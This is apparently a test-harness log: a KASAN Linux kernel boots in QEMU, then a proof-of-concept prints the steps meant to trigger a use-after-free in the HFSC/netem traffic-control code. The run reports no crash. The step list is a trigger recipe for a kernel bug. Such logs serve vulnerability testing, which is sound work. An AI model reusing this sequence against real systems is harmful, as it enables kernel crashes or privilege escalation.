bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JNo EFI environment detected.
early console in extract_kernel
input_data: 0x0000000004be93a8
input_len: 0x0000000001991573
output: 0x0000000001000000
output_len: 0x00000000055054cc
kernel_total_size: 0x0000000005230000
needed_size: 0x0000000005600000
trampoline_32bit: 0x000000000009d000


KASLR disabled: 'nokaslr' on cmdline.


Decompressing Linux... Parsing ELF... No relocation needed... done.
Booting the kernel (entry_offset: 0x0000000000000000).
[    0.000000] Linux version 6.4.0-04323-g0caec6a2da6a-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #2 SMP PREEMPT_DYNAMIC Sat May 16 20:24:06 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000004] kvm-clock: using sched offset of 1139912828 cycles
[    0.002947] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.014951] tsc: Detected 2995.198 MHz processor
[    0.024483] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.027421] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.031266] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.047843] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.051107] Using GB pages for direct mapping
[    0.053617] Incomplete global flushes, disabling PCID
[    0.054651] RAMDISK: [mem 0x7fe8d000-0x7ffdffff]
[    0.059857] ACPI: Early table checksum verification disabled
[    0.063772] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.067096] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.071930] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.076871] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.082215] ACPI: FACS 0x000000007FFE0000 000040
[    0.085736] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.093333] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.100582] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.109436] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.115840] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.120940] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.126314] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.131482] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.140142] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.154637] No NUMA configuration found
[    0.164104] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.176983] NODE_DATA(0) allocated [mem 0x7fe89000-0x7fe8cfff]
[    0.187870] Zone ranges:
[    0.191493]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.195685]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.204957]   Normal   empty
[    0.207351] Movable zone start for each node
[    0.213952] Early memory node ranges
[    0.219816]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.228771]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.239505] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.247989] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.248170] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.315518] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.519510] kasan: KernelAddressSanitizer initialized
[    0.531395] ACPI: PM-Timer IO Port: 0x608
[    0.533572] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.539492] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.543630] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.547841] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.551763] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.555493] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.559105] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.562925] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.566617] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.569697] TSC deadline timer available
[    0.572087] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.575155] kvm-guest: KVM setup pv remote TLB flush
[    0.578741] kvm-guest: setup PV sched yield
[    0.581272] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.585013] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.589474] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.593902] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.598280] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.601744] Booting paravirtualized kernel on KVM
[    0.604334] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.630045] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.635747] percpu: Embedded 66 pages/cpu s232104 r8192 d30040 u1048576
[    0.639851] Kernel command line: console=ttyS0 oops=panic panic=-1 nokaslr earlyprintk=serial
[    0.645187] Unknown kernel command line parameters "nokaslr", will be passed to user space.
[    0.650183] random: crng init done
[    0.655885] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.662180] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.666529] Fallback order for Node 0: 0 
[    0.666539] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.671825] Policy zone: DMA32
[    0.673368] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.676493] stackdepot: allocating hash table via alloc_large_system_hash
[    0.685487] stackdepot hash table entries: 1048576 (order: 11, 8388608 bytes, linear)
[    0.722168] Memory: 1692940K/2096632K available (49152K kernel code, 7933K rwdata, 10028K rodata, 5616K init, 3052K bss, 403436K reserved, 0K cma-reserved)
[    0.731309] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
Poking KASLR using RDRAND RDTSC...
[    0.740828] Dynamic Preempt: voluntary
[    0.747293] rcu: Preemptible hierarchical RCU implementation.
[    0.750253] rcu: 	RCU event tracing is enabled.
[    0.752496] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.755655] 	Trampoline variant of Tasks RCU enabled.
[    0.758132] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.761907] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.783545] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.787258] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.811956] Console: colour VGA+ 80x25
[    0.814175] printk: console [ttyS0] enabled
[    0.814175] printk: console [ttyS0] enabled
[    0.818269] printk: bootconsole [earlyser0] disabled
[    0.818269] printk: bootconsole [earlyser0] disabled
[    0.822979] ACPI: Core revision 20230331
[    0.825332] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.830097] APIC: Switch to symmetric I/O mode setup
[    0.833617] kvm-guest: setup PV IPIs
[    0.841348] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.845215] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    0.851040] Calibrating delay loop (skipped) preset value.. 5990.39 BogoMIPS (lpj=2995198)
[    0.853029] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.855608] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.856029] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.856098] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.857057] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.858042] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.859042] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.860043] RETBleed: Mitigation: Enhanced IBRS
[    0.861050] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.862043] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.863043] MMIO Stale Data: Unknown: No mitigations
[    0.865125] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.866041] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.867042] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.868042] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.869029] x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'compacted' format.
[    0.918606] Freeing SMP alternatives memory: 44K
[    0.919043] pid_max: default: 32768 minimum: 301
[    0.920244] LSM: initializing lsm=capability,selinux,integrity
[    0.922077] SELinux:  Initializing.
[    0.923249] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.924050] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.927029] smpboot: CPU0: 13th Gen Intel(R) Core(TM) i9-13900H (family: 0x6, model: 0xba, stepping: 0x2)
[    0.927799] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1.
[    0.928200] Performance Events: unsupported p6 CPU model 186 no PMU driver, software events only.
[    0.929183] signal: max sigframe size: 1776
[    0.930268] rcu: Hierarchical SRCU implementation.
[    0.931063] rcu: 	Max phase no-delay instances is 400.
[    0.933448] smp: Bringing up secondary CPUs ...
[    0.934683] smpboot: x86: Booting SMP configuration:
[    0.935071] .... node  #0, CPUs:      #1
[    0.943076] smp: Brought up 1 node, 2 CPUs
[    0.945062] smpboot: Max logical packages: 1
[    0.946062] smpboot: Total of 2 processors activated (11980.79 BogoMIPS)
[    0.957044] devtmpfs: initialized
[    0.966333] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.967070] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.969075] PM: RTC time: 20:25:37, date: 2026-05-16
[    0.970824] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.971841] audit: initializing netlink subsys (disabled)
[    0.972320] audit: type=2000 audit(1778963137.317:1): state=initialized audit_enabled=0 res=1
[    0.973235] thermal_sys: Registered thermal governor 'step_wise'
[    0.974060] thermal_sys: Registered thermal governor 'user_space'
[    0.975174] cpuidle: using governor menu
[    0.978167] PCI: Using configuration type 1 for base access
[    0.979581] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.984628] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.988059] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.994029] ACPI: Added _OSI(Module Device)
[    0.996061] ACPI: Added _OSI(Processor Device)
[    0.999054] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.001063] ACPI: Added _OSI(Processor Aggregator Device)
[    1.026766] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.199918] ACPI: Interpreter enabled
[    1.200240] ACPI: PM: (supports S0 S3 S4 S5)
[    1.201066] ACPI: Using IOAPIC for interrupt routing
[    1.202374] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.203090] PCI: Using E820 reservations for host bridge windows
[    1.205528] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.247456] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.248117] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.249059] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    1.250268] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    1.251721] PCI host bridge to bus 0000:00
[    1.252083] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.253079] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.254078] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.255072] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    1.256077] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    1.257100] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.258396] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    1.275661] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    1.297566] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    1.304085] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    1.306988] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    1.307075] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    1.308075] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    1.309081] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    1.311279] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    1.315846] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.316143] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.319220] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    1.322029] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    1.327194] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    1.333054] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    1.335029] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.355878] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    1.358291] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    1.361002] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    1.368156] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    1.390264] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.392870] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.394728] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.396838] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.399275] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.405444] iommu: Default domain type: Translated 
[    1.406071] iommu: DMA domain TLB invalidation policy: lazy mode 
[    1.408958] SCSI subsystem initialized
[    1.411029] ACPI: bus type USB registered
[    1.412029] usbcore: registered new interface driver usbfs
[    1.413988] usbcore: registered new interface driver hub
[    1.415830] usbcore: registered new device driver usb
[    1.418166] pps_core: LinuxPPS API ver. 1 registered
[    1.427076] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.438309] PTP clock support registered
[    1.451504] Advanced Linux Sound Architecture Driver Initialized.
[    1.455488] NetLabel: Initializing
[    1.456059] NetLabel:  domain hash size = 128
[    1.457059] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.458245] NetLabel:  unlabeled traffic allowed by default
[    1.460638] PCI: Using ACPI for IRQ routing
[    1.463234] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.464029] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.464029] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.464067] vgaarb: loaded
[    1.465695] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.466130] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.471005] clocksource: Switched to clocksource kvm-clock
[    1.473704] VFS: Disk quotas dquot_6.6.0
[    1.478558] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.486007] pnp: PnP ACPI init
[    1.492220] pnp: PnP ACPI: found 6 devices
[    1.517252] hrtimer: interrupt took 4005215 ns
[    1.590093] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.610481] NET: Registered PF_INET protocol family
[    1.616155] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.714103] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    1.727263] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    1.751114] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    1.767479] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    1.782672] TCP: Hash tables configured (established 16384 bind 16384)
[    1.813372] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.823064] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.842849] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    1.871648] RPC: Registered named UNIX socket transport module.
[    1.878304] RPC: Registered udp transport module.
[    1.882097] RPC: Registered tcp transport module.
[    1.882455] kwatchdog (36) used greatest stack depth: 30296 bytes left
[    1.887736] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.972421] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.981862] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.992175] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    2.001822] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    2.013071] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    2.037789] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    2.045681] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    2.052973] PCI: CLS 0 bytes, default 64
[    2.073584] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    2.125534] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2b2c8d6afc8, max_idle_ns: 440795331172 ns
[    2.368742] Unpacking initramfs...
[    3.737470] Freeing initrd memory: 1356K
[    6.275411] Initialise system trusted keyrings
[    6.347773] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    6.472207] NFS: Registering the id_resolver key type
[    6.476892] Key type id_resolver registered
[    6.480591] Key type id_legacy registered
[    6.485213] 9p: Installing v9fs 9p2000 file system support
[    6.506174] Key type asymmetric registered
[    6.512123] Asymmetric key parser 'x509' registered
[    6.520879] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    6.530435] io scheduler mq-deadline registered
[    6.537635] io scheduler kyber registered
[    6.542255] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    6.553887] ACPI: button: Power Button [PWRF]
[    6.567268] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    6.571178] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    6.582429] Non-volatile memory driver v1.3
[    6.585407] Linux agpgart interface v0.103
[    6.589579] ACPI: bus type drm_connector registered
[    6.611153] loop: module loaded
[    6.624642] scsi host0: ata_piix
[    6.629568] scsi host1: ata_piix
[    6.632273] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    6.636225] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    6.646519] e100: Intel(R) PRO/100 Network Driver
[    6.648858] e100: Copyright(c) 1999-2006 Intel Corporation
[    6.651441] e1000: Intel(R) PRO/1000 Network Driver
[    6.658246] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    6.807717] ata2: found unknown device (class 0)
[    6.816117] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    6.834447] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    6.875052] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    6.879573] cdrom: Uniform CD-ROM driver Revision: 3.20
[    7.977649] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    8.514335] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    8.518567] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    8.523536] e1000e: Intel(R) PRO/1000 Network Driver
[    8.530860] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    8.534406] sky2: driver version 1.30
[    8.546125] usbcore: registered new interface driver usblp
[    8.551033] usbcore: registered new interface driver usb-storage
[    8.558225] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    8.574416] serio: i8042 KBD port at 0x60,0x64 irq 1
[    8.578029] serio: i8042 AUX port at 0x60,0x64 irq 12
[    8.587292] rtc_cmos 00:05: RTC can wake from S4
[    8.587759] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    8.596775] rtc_cmos 00:05: registered as rtc0
[    8.603339] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    8.607552] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@redhat.com
[    8.612397] intel_pstate: CPU model not supported
[    8.615663] hid: raw HID events driver (C) Jiri Kosina
[    8.619769] usbcore: registered new interface driver usbhid
[    8.625138] usbhid: USB HID core driver
[    8.632652] netem: version 1.3
[    8.634822] u32 classifier
[    8.638428]     input device check on
[    8.641177]     Actions configured
[    8.647096] Initializing XFRM netlink socket
[    8.652716] NET: Registered PF_INET6 protocol family
[    8.675534] Segment Routing with IPv6
[    8.683492] In-situ OAM (IOAM) with IPv6
[    8.688770] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    8.703132] NET: Registered PF_PACKET protocol family
[    8.708995] 9pnet: Installing 9P2000 support
[    8.714271] Key type dns_resolver registered
[    8.725280] IPI shorthand broadcast: enabled
[    8.777011] sched_clock: Marking stable (8724057898, 52907668)->(9325466906, -548501340)
[    8.791641] registered taskstats version 1
[    8.795440] Loading compiled-in X.509 certificates
[    8.841166] PM:   Magic number: 10:692:447
[    8.850777] printk: console [netcon0] enabled
[    8.853969] netconsole: network logging started
[    8.857154] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    8.865397] kworker/u4:2 (53) used greatest stack depth: 29536 bytes left
[    8.877659] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    8.885702] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    8.891321] ALSA device list:
[    8.896138] cfg80211: failed to load regulatory.db
[    8.899781]   No soundcards found.
[    8.924545] Freeing unused kernel image (initmem) memory: 5616K
[    8.935038] Write protecting the kernel read-only data: 59392k
[    8.939506] Freeing unused kernel image (rodata/data gap) memory: 212K
[    8.985602] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    8.991762] Run /init as init process
[    9.011799] mount (57) used greatest stack depth: 28760 bytes left

secb: rootfs ready
---- poc begin ----
[*] drr root 1:0
[*] drr classes 1:1 1:2
[*] plug 10:0 under 1:2 (starts plugged)
[*] pre-seed plug: send priority=0x00010002
[*] u32 catch-all filter on drr root -> 1:1
[*] hfsc 2:0 under 1:1
[*] hfsc class 2:1 (RSC only) under 2:0
[*] hfsc class 2:2 (FSC only) under 2:0
[*] netem 3:0 under 2:1 (latency=100000000 ns)
[*] blackhole 4:0 under 3:0
[*] sending 1 byte priority=0x00020001 -> hfsc class 2:1 -> netem (delayed)
[*] sleeping 1500000 us so netem time_to_send becomes past
[    9.562786] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[*] RTM_NEWTCLASS replace 2:1 ADDING the FSC curve (triggers vttree dangling-insert)
[   10.630489] qdisc_peek_len: netem qdisc 3: is non-work-conserving?
[*] RTM_DELTCLASS 2:1 (kfree's hfsc_class with live vttree node)
[*] unplug 10:0
[*] send 1 byte priority=0x00020002 -> hfsc class 2:2 (init_vf -> vttree_insert -> KASAN UAF)
[*] poc finished without crash; unexpected on the vulnerable kernel
[   12.645495] poc (63) used greatest stack depth: 27432 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[   14.924396] ACPI: PM: Preparing to enter system sleep state S5
[   14.929847] reboot: Power down
NO_CRASH_DETECTED
